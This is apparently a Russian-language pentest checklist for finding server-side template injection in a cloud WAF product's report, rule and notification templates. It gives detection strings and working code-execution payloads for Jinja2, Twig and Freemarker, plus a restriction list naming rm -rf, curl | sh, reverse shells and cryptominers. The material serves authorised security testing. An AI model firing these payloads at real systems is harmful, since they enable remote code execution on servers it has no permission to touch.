# Template Injection (SSTI) — PT AF Cloud

## Что ищем
Server-Side Template Injection в шаблонах правил, отчётов, уведомлений, PDF-генерации.

## Где искать
- Шаблоны правил AF (custom rules с template-синтаксисом)
- Шаблоны отчётов (PDF/HTML)
- Шаблоны уведомлений (email, webhook)
- Шаблоны рекомендаций
- Названия tenant / domain / policy (могут рендериться в шаблон)
- Поля описания инцидента (рендер в PDF)

## Движки (проверить по стеку)
- **Jinja2 (Python):** `{{7*7}}`, `{{config}}`, `{{''.__class__.__mro__}}`
- **Twig (PHP):** `{{7*7}}`, `{{_self.env.registerUndefinedFilterCallback("exec")}}`
- **Freemarker (Java):** `${7*7}`, `<#assign ex="freemarker.template.utility.Execute"?new()>`
- **Velocity (Java):** `#set($x=7*7)$x`
- **Handlebars (Node):** `{{#with "s" as |string|}}...`
- **EJS (Node):** `<%= 7*7 %>`
- **Go templates:** `{{.}}`, `{{printf "%s" "x"}}`

## Базовый детект
```
{{7*7}}        → 49 = Jinja2/Twig/Nunjucks
${7*7}         → 49 = Freemarker/Velocity/JSP EL
<%= 7*7 %>     → 49 = EJS/ERB
#{7*7}         → 49 = Ruby
{7*7}          → 49 = Smarty
```

## Эксплуатация (PoC, безопасно)
- **Jinja2:** `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- **Twig:** `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`
- **Freemarker:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

## Ограничения PT
- PoC — только `id` / `whoami` / `hostname`
- Никаких reverse shell, persistence, cryptominer
- Не выполнять destructive-команды
- Только в тестовом tenant

## Инструменты
- tplmap
- Burp + Intruder
- Ручной детект через `{{7*7}}`

## Чек-лист
- [ ] Найти все места, где пользовательский ввод рендерится в шаблон
- [ ] Подставить `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
- [ ] Определить движок по результату
- [ ] Попробовать RCE-PoC для конкретного движка (`id`)
- [ ] Проверить шаблоны отчётов / уведомлений / правил
- [ ] Проверить названия tenant / domain / policy

## Не делать
- Не выполнять `rm -rf`, `curl | sh`, reverse shell
- Не оставлять следов
- В PoC — только `id`
